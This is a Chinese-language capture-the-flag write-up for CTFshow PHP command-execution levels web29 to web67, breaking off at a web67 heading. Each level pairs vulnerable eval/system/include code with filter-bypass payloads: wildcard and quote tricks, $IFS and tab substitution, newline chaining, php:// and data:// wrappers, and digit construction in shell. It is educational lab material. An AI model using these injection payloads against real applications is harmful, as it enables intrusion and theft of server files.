# CTFSHOW php命令执行

**目录**

[TOC]





## web29  过滤flag

```php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

这里能发现是匹配flag  但是存在高亮 高亮有需要路径

同时存在eval  命令执行

所以我们传入命令

但是过滤了flag

我们看看怎么绕过

```perl
?c=system("ls ./");
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/7544f129fbc7967589504a20e4b328d4.png" alt="" style="max-height:155px; box-sizing:content-box;" />


发现了 flag

我们绕过正则匹配flag字符串

```cobol
payload1: ?c=system("cat f*");    f*匹配 f开头的文件
payload2: ?c=system("cat fl\ag.php");
payload3: ?c=system("cat fla?????");   一定要5个 因为 ? 匹配一个任意字符 
payload4: ?c=echo `cat fl""ag.php`;    `` 内联
payload5: ?c=eval($_GET['1']);&1=system('cat flag.php');
```





<img src="https://i-blog.csdnimg.cn/blog_migrate/c636b7fa9b41aed149a4df09d7d637e2.png" alt="" style="max-height:169px; box-sizing:content-box;" />


## web30   过滤system php

```php
 
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php/i", $c)){
过滤了关键词
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

system 可以使用

exec代替

还存在很多

```scss
system()
passthru()
exec()
shell_exec()
popen()
proc_open()
pcntl_exec()
反引号 同shell_exec() 
```

php可以使用???代替

```bash
payload1: ?c=echo exec("cat f*");
payload2: ?c=echo exec("cat fla?????");
```

## web31 过滤    cat|sort|shell|\.

```php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

cat被过滤了

我们可以使用

```bash
more:一页一页的显示档案内容
 
 
less:与 more 类似 head:查看头几行
 
 
tac:从最后一行开始显示，可以看出 tac 是cat 的反向显示
 
 
tail:查看尾几行
 
 
nl：显示的时候，顺便输出行号
 
 
od:以二进制的方式读取档案内容
 
 
vi:一种编辑器，这个也可以查看
 
 
vim:一种编辑器，这个也可以查看
 
 
sort:可以查看
```

```cobol
payload1: ?c=eval($_GET[1]);&1=system('cat  f*');
payload2: ?c=include($_GET[1]);&1=php://filter/read=convert.base64-encode/resource=flag.php
```

## 这里有一个新姿势 可以学习一下



我们首先了解一下代码

```scss
__FILE__ 
 
表示当前文件
完整路径和文件名
 
dirname()
获取一个网站路径的目录名
 
scandir()
 
读取目录的文件 然后作为一个数组
 
print_r()
 
打印数组内容
```

```cobol
print_r(scnandir(dirname(__FILE__)));
 
1.执行 __FILE__ 获取当前文件的完整路径 例如 /var/www/html/1.php
 
2.执行dirname 获取目录名 即 /var/www/html
 
3.将目录下的内容转为数组 
 
4.通过print_r数组输出
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/fb898f02d99624e4203c3476d9469ac2.png" alt="" style="max-height:137px; box-sizing:content-box;" />


这里能发现当前目录下存在 flag.php 和 index.php

通过这个我们可以读取 目录文件

然后我们需要选中文件

```cobol
print_r(next(array_reverse(scandir(dirname((__FILE__))))));
 
 
array_reverse()  倒序排列
 
next() 指向数组下一元素
 
其实可以直接选择
 
?c=print_r(scandir(dirname((__FILE__)))[2]);
```





<img src="https://i-blog.csdnimg.cn/blog_migrate/fb9a5d0306603da18981b1dc91f3b0eb.png" alt="" style="max-height:163px; box-sizing:content-box;" />


最后通过高亮返回代码即可

```cobol
?c=highlight_file(scandir(dirname((__FILE__)))[2]);
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/c352c73cd2c46874231bdda1f18d03b3.png" alt="" style="max-height:366px; box-sizing:content-box;" />


## web32 过滤 ；`` '' .

这道题把我们的 ) 也过滤了 所以刚刚学会的东西 没办法了

```php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

主要是符号的过滤

所以这道题

我们可以使用

```cobol
payload1: ?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
payload2: ?c=include$_GET[1]?>&1=data://text/plain,<?php system("cat flag.php");?>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/df3aa393b0f92359c8801b1aa32b738e.png" alt="" style="max-height:140px; box-sizing:content-box;" />


## web33

```php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

和32差不多

过滤的东西不影响我们通过逃逸参数1

```cobol
/?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
```

## web34

```php
 
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

好像还是可以使用

只是多过滤了一个 ;

```cobol
?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
```

## web35

```php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

一样的 只要没过滤 include 我们就可以使用之前的payload

这题我们使用看看 require

```cobol
/?c=require$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/47bfc04b9e6a630eed3150bd65a2c6e6.png" alt="" style="max-height:740px; box-sizing:content-box;" />


## web36

```cobol
 
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=|\/|[0-9]/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}


过滤了数字  " =
```

没什么 只要把参数1 变为 a  就可以绕过了

```cobol
/?c=require$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
```

## web37 data伪协议

```php
//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```

匹配flag的字符串

这里不能使用php://filter来读取 因为过滤了flag

但是我们可以使用data伪协议

```cobol
?c=data://text/plain,<?php system('tac fla?.php');?>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/8b3aaf97ee6fa0bba0d30a5756032ac2.png" alt="" style="max-height:613px; box-sizing:content-box;" />


在data中 还可以指定 ;base64

```cobol
data://text/plain;bvase64,base64加密后的命令
```

## web38 短开表达式

```php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|php|file/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```



```cobol
?c=data://text/plain,<?=system('tac fla?.?hp');?>
```

这里是使用了短开表达式

<?=  相当于 <?php echo   对后面的php也模糊匹配

就可以了

## web39

```cobol
//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c.".php");
    }
        
}else{
    highlight_file(__FILE__);
}
```

```cobol
?c=data://text/plain,<?php system('tac fla?.php');?>
```

因为data是将后面的php直接执行

## web40   __FILE__命令的扩展

```php
 
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }
        
}else{
    highlight_file(__FILE__);
} 
 
 
过滤了很多符号和数字
 
```

这里没有过滤字母

可以使用我们之前的姿势来读取

```cobol
?c=highlight_file(next(array_reverse((scandir(dirname((__FILE__)))))));
```

这里补充一下知识点

```scss
__FILE__：当前文件的目录
 
print_r 数组的输出
 
print_r(dirname(__FILE__));
 
可以打印出当前文件的父级目录
 
 
print_r(scandir(dirname(__FILE__)));
 
把父级目录中的文件 通过数组来打印出来
 
array_reverse()
 
倒叙输出
 
next()
指向当前指针的下一位
 
end()
指向数组最后一位
 
reset()
指向数组第一个
 
prev()
指针往回走一位
 
each()
返回当前指针的值 并且指针向前走一位
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/4bb70599efe3c7cd7925d7afc3755ea6.png" alt="" style="max-height:265px; box-sizing:content-box;" />


## web41

这道题就是使用师傅的脚本来跑就可以了

## web42 重定向

```php
 
 
if(isset($_GET['c'])){
    $c=$_GET['c'];
    system($c." >/dev/null 2>&1");
}else{
    highlight_file(__FILE__);
}
```

```cobol
system($c." >/dev/null 2>&1");
 
 
我们的标准输入为 1     输出为2
 
 
 
这个其实可分解
 
1>/dev/null   输入输出到null 黑洞
 
2>&1  输出设为输入
 
 
其实就是直接把命令抛弃
 
```

这道题目我们直接使用 截断即可

```cobol
payload1: ls%0a
payload2: ls;
payload3: ls&&ls 这里的&&需要url编码  %26%26
```





<img src="https://i-blog.csdnimg.cn/blog_migrate/9a8029f7b85bd0455f97541ecb5cc4ca.png" alt="" style="max-height:91px; box-sizing:content-box;" />


```cobol
payload1: cat flag.php%0a
payload2: cat flag.php;
payload3: cat flag.php&&ls 这里的&&需要url编码  %26%26
```





<img src="https://i-blog.csdnimg.cn/blog_migrate/1a2fae7c18853d3d18cb6bf18166dc49.png" alt="" style="max-height:102px; box-sizing:content-box;" />


## web43

```php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

过滤cat 和 分号

```cobol
payload1: ls%26%26ls
payload2: ls%0a
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/d54069a9dfeea86f2051f3fe2bc62a78.png" alt="" style="max-height:102px; box-sizing:content-box;" />




```cobol
payload1:tac flag.php%0a
payload2 tac flag.php%26%26ls
```



pay



<img src="https://i-blog.csdnimg.cn/blog_migrate/f3ccc016f9e95ef1627759334f4a79db.png" alt="" style="max-height:227px; box-sizing:content-box;" />


## web44

```php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/;|cat|flag/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

加了过滤flag 可以使用模糊匹配

```cobol
payload1:tac fla?.php%0a
payload2 tac fla?.php%26%26ls
```





<img src="https://i-blog.csdnimg.cn/blog_migrate/b7919ad7fde96d31d30603b49f14238c.png" alt="" style="max-height:180px; box-sizing:content-box;" />


## web45

```php
 
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| /i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

加了个空格过滤

```cobol
${IFS}
$IFS$9
<
<>
```

```cobol
payload1:tac$IFS$9fla?.php%0a
payload2 tac$IFS$9fla?.php%26%26ls
```





<img src="https://i-blog.csdnimg.cn/blog_migrate/5d9aac9d41f57be520bb64de27cc034a.png" alt="" style="max-height:192px; box-sizing:content-box;" />


## web46

```php
 
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

过滤数字 $ 还有*



%09 是 tab的url编码

```perl
tac%09fla?.php%0a
tac%09fla?.php%26%26ls
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/f617fe70dfb0ea2ab742e23e6003db35.png" alt="" style="max-height:219px; box-sizing:content-box;" />


## web47

```php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

过滤了更多的命令 用上一个payload接着打

```perl
tac%09fla?.php%0a
tac%09fla?.php%26%26ls
```

## web48

```php
 
 
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

好像还是可以接着打

只是过滤了更多的命令和 内联执行

```perl
tac%09fla?.php%0a
tac%09fla?.php%26%26ls
```

## web49

```php
 
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

但是我们这个在浏览器解析 自动会解析为 tab和换行

所以过滤无法过滤

所以接着打

```perl
tac%09fla?.php%0a
tac%09fla?.php%26%26ls
```

## web50

```php
*/
 
 
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

发现过滤了26和09的编码

并且这个题目的 ? 无法使用 所以我们需要通过 绕过 因为正则只匹配flag完整字符串

```bash
tac<fla''g.php%0a
tac<fla''g.php||ls
```

## web51

```php
 
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

过滤了一些输出的命令

```bash
nl<fla''g.php%0a
nl<fla''g.php||ls
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/11f5a0fab1cb27fda91cc6ba77b4f735.png" alt="" style="max-height:110px; box-sizing:content-box;" />


## web52

```php
 
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

发现又过滤了 <>  但是把我们的 $放出来了

这里我们首先先看看ls

```r
?c=ls||
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/20c6dd8a7d12328fcc135215438f7fbc.png" alt="" style="max-height:161px; box-sizing:content-box;" />


直接访问一下flag.php

```bash
/?c=nl${IFS}fla''g.php||
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/968cef323935620621b8ff858af0eab0.png" alt="" style="max-height:223px; box-sizing:content-box;" />


发现没有

我们看看根目录

```bash
?c=ls${IFS}/||
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/320629d72826b4b7ff7eecb01b1a9ee5.png" alt="" style="max-height:108px; box-sizing:content-box;" />


发现了flag

直接访问

```bash
?c=nl${IFS}/fla''g||
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/2e2d159e0234670becc8fbe1d8f7e4b8.png" alt="" style="max-height:192px; box-sizing:content-box;" />


## web53

```php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        echo($c);
        $d = system($c);
        echo "<br>".$d;
    }else{
        echo 'no';
    }
}else{
    highlight_file(__FILE__);
} 
```

```bash
/?c=nl${IFS}fla?.php
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/1358d1b7b8db9639d9d73846aa2e61f2.png" alt="" style="max-height:207px; box-sizing:content-box;" />




## web54  c=/bin/?at${IFS}fla?????

```php
 
 
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/3924f5c8a3dbc36dc256ff09e5afef78.png" alt="" style="max-height:201px; box-sizing:content-box;" />




发现nl也过滤了

这里还有其他读取的方式

```bash
?c=paste${IFS}fla?.php
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/169dd2731e063a291298941734c709ab.png" alt="" style="max-height:191px; box-sizing:content-box;" />


或者继续使用cat

通过模糊匹配

```ruby
?c=/bin/?at${IFS}fla?????
```

## web55   base64返回值  bzip2解压后下载

```php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
} 
```

过滤a-z字母

### base64

我们可以通过bin下的base64命令返回

```ruby
?c=/???/????64 ????.???
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/7ff84cab2bc36adaa709a9984c3ad5e2.png" alt="" style="max-height:271px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/f6d82e59b2766cd9197e54de794aea4c.png" alt="" style="max-height:392px; box-sizing:content-box;" />


### bzip2

bzip是存在 /usr/bin/bzip2

所以我们构造

```ruby
?c=/???/???/????2 ????.???
```

然后访问

```cobol
/flag.php.bz2
```

得到文件

## web56  通过文件上传和 . 来执行命令

### 要注意 如果过滤了 空格 就无法实现 并且要通过system函数

```r
\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\%|\x09|\x26|\x0a|\>|\,|\*|\<|
 
这个情况的过滤不可使用
 
 
\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\%|\x09|\x26|\x0a|\>|\,|\*|\<
 
这个情况下的过滤可以使用
 
 
因为第一个是会匹配所有字符
 
在自己测试这里蠢了 困扰了很久
 
 
```

 [无字母数字的命令执行(ctfshow web入门 55）_无字母数字执行命令_Firebasky的博客-CSDN博客](https://blog.csdn.net/qq_46091464/article/details/108513145) 

 [https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html) 

```cobol
// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

过滤了很多符号

过滤了数字和字母

我们无法使用数字和字母来执行命令

但是其没有过滤 . (点)

这道题主要的方向

```cobol
1.没有过滤. 
在linux中 .不需要x权限就可以执行
 
所以我们如果有一个可控的文件
那么我们可以直接执行这个文件
 
2.我们如果上传一个文件 一般情况下是临时保存在 ./tmp/phpXXXXXX中
 
其中后六位是随机生成的大小写字母
 
```

这里我们就可以通过本地的网站 链接到 攻击的靶场 然后通过post文件

达到执行我们上传的木马文件

但是我们如何通过过滤去访问文件呢

```cobol
./tmp/phpXXXXXX 
 
首先我们可以通过 ？ 来模糊匹配
 
 
./???/???XXXXXX 
 
那我们如何匹配后面的呢
 
因为/tmp/ 下会有很多类似的文件
 
所以我们可以通过正则匹配来匹配文件
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/4ef4c950d389cf73cc97edc3c8244220.png" alt="" style="max-height:585px; box-sizing:content-box;" />


我们能发现

大写字母在 @和[之间

那我们只需要通过正则匹配 @-[即可

所以我们get的方式就是

```ruby
?c=.+/???/????????[@-[]
```

```cobol
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<form action="http://cd3eb1d9-31ec-4644-b057-c38153f6a911.challenge.ctf.show/" method="post" enctype="multipart/form-data">
<!--链接是当前打开的题目链接-->
    <label for="file">文件名：</label>
    <input type="file" name="file" id="file"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```

本地搭建发送包的文件

随便上传一个文件



<img src="https://i-blog.csdnimg.cn/blog_migrate/bc974599c0472a3c388fd0a8bca06f4f.png" alt="" style="max-height:722px; box-sizing:content-box;" />


这样就行了

然后通过pwd 执行绝对路径

```cobol
cat /var/www/html/flag.php
```

如果没有回显就多发几次 因为最后一位不一定是大写



<img src="https://i-blog.csdnimg.cn/blog_migrate/8db43857f0d3fabed13aa6f81fae0e94.png" alt="" style="max-height:670px; box-sizing:content-box;" />




## web57  过滤数字 但是通过shell拼凑数字的方式

```cobol
<?php
 
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-08 01:02:56
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/
 
// 还能炫的动吗？
//flag in 36.php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
        system("cat ".$c.".php");
    }
}else{
    highlight_file(__FILE__);
} 
```

发现过滤了 ? . 所以56的方法也无法实现

这里提示我们 flag是在36.php处

需要运用到linuxshell的特性

### 0x01

```crystal
${_} 返回上一条命令
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/4b264476265e666c3a9c70b13bb26b72.png" alt="" style="max-height:72px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/d9a8db048b7f05e01dfe0c808a24560d.png" alt="" style="max-height:76px; box-sizing:content-box;" />


那我们如果没有命令呢



<img src="https://i-blog.csdnimg.cn/blog_migrate/ffe7fca2090cfc5028d11f7f43cdeefd.png" alt="" style="max-height:80px; box-sizing:content-box;" />




```typescript
$(())
做运算
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/2a6104e6e21e158eac8bb73bac55d381.png" alt="" style="max-height:57px; box-sizing:content-box;" />


那如果我们将 ${_}的值放入是多少呢

```bash
echo $((${_}))
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/51c588c1c9159277d0c0ff4c0f0e5229.png" alt="" style="max-height:80px; box-sizing:content-box;" />


这里就相当于 $((0))   将0 做运算 那么就是 0

那我们如果 通过 ~ 取反呢



<img src="https://i-blog.csdnimg.cn/blog_migrate/5dc5839e91b6173cc7c20f1ab14b8784.png" alt="" style="max-height:66px; box-sizing:content-box;" />


发现取反后是-1

那我们如果想要-2怎么办

```cobol
-1-1=-2
```

所以我们只需要将两个 -1做运算即可

```crystal
echo $(($((~${_}))$((~${_})))) 
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/5a0df2e339264b323a7c6434ab438656.png" alt="" style="max-height:84px; box-sizing:content-box;" />


那我们想要-3也很简单了

```crystal
echo $(($((~${_}))$((~${_}))$((~${_})))) 
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/bcc50176d81d5a9a37c81f661c649f2c.png" alt="" style="max-height:74px; box-sizing:content-box;" />


那既然他说是在 36.php 那我们直接拼凑 -36出来

```crystal
echo $(($((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))))
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/531f2ca18434c3ad4894ec03d033cdfd.png" alt="" style="max-height:132px; box-sizing:content-box;" />


那我们再做一次取反即可

但是取反后是35 所以我们在最后再加一个即可

```crystal
echo $((~$(($((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))$((~${_}))))))
 
echo $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/632dc443142362e49664f5cb1df9da97.png" alt="" style="max-height:138px; box-sizing:content-box;" />


现在我们就可以直接访问36了

但是我们无法知道命令

所以我们可以使用

```typescript
$(($(())))
 
0
 
 
$(($((~$(())))$((~$(())))))
 
-2
 
 
$(($((~$(())))$((~$(())))$((~$(())))))
 
 
-3
```

但是其实两个方式都可以访问 只是第一个着重于命令



<img src="https://i-blog.csdnimg.cn/blog_migrate/9eba62a7006f237f436e38ba35452e70.png" alt="" style="max-height:262px; box-sizing:content-box;" />


## web58  show_source

```cobol
<?php
 
/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
 
*/
 
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
} 
```

发现是变为 POST了

首先通过post传递system()

```perl
c=system(ls);
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/bf2e75edb4a965484c49f28e43729144.png" alt="" style="max-height:170px; box-sizing:content-box;" />


发现禁用了



<img src="https://i-blog.csdnimg.cn/blog_migrate/0138d3e9af8ebde75c5a0136de221f82.png" alt="" style="max-height:144px; box-sizing:content-box;" />


其他函数都被禁用了

所以只能使用php内置函数

```lisp
c=print_r(scandir(dirname(__FILE__)));
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/250659f396d6c78ddb6b3e46ea03f7b4.png" alt="" style="max-height:169px; box-sizing:content-box;" />




```cobol
c=highlight_file(scandir(dirname(__FILE__))[2]);
```

或者直接使用show_source来读取

```cobol
c=show_source('flag.php');
```

## web59

```cobol
<?php
 
/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
 
*/
 
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
} 
```

继续尝试

```cobol
c=highlight_file(scandir(dirname(__FILE__))[2]);
```

这个方法还是可以

发现题目是一样的 我也不懂

```cobol
c=show_source('flag.php');
```

## web60

```cobol
<?php
 
/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
 
*/
 
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
} 
```

发现还是一样的

## web62-65

全是一样的。。。。

## web66  show_source被禁用

```cobol
<?php
 
/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
 
*/
 
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
} 
```

```cobol
c=highlight_file(scandir(dirname(__FILE__))[2]);
```





<img src="https://i-blog.csdnimg.cn/blog_migrate/1c172128dd611e5b2d4744a3a8d69ab0.png" alt="" style="max-height:347px; box-sizing:content-box;" />


发现文件不对

那我们直接去根目录看看

```lisp
c=print_r(scandir('/'));
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/21691a94a1800be1cf6ee9ac8a04dc9c.png" alt="" style="max-height:219px; box-sizing:content-box;" />


发现了flag.txt那我们直接读取就可以了

```cobol
c=highlight_file('/'.scandir('/')[6]);
 
 
c=highlight_file(/flag.txt);
```

## web67  print_r被禁用



